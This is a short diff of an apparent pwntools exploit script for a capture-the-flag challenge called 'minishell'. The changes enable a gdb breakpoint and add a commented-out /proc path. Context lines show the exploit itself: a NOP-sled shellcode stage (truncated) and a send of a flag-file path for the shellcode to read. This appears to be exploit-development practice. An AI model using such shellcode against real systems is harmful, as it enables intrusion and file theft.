@@ -29,7 +29,7 @@ def start(argv=[], *a, **kw):
         return remote(argv, *a, **kw)
 
 gdbscript = '''
-#break *0x555555554cde
+break *0x555555554cde
 continue
 '''.format(**locals())
 
@@ -103,6 +103,7 @@ stage3 = "\x90" * 49 + "\x90" + "\x48\x31\xC0\x48\x31\xFF\x48\x89\xE6\x48\xC7\xC
 io.send(stage3)
 io.send('/home/minishell/flag.txt\x00')
 #io.send('flag.txt\x00')
+#io.send('/proc/12136/cwd/\x00')
 
 io.interactive()
 
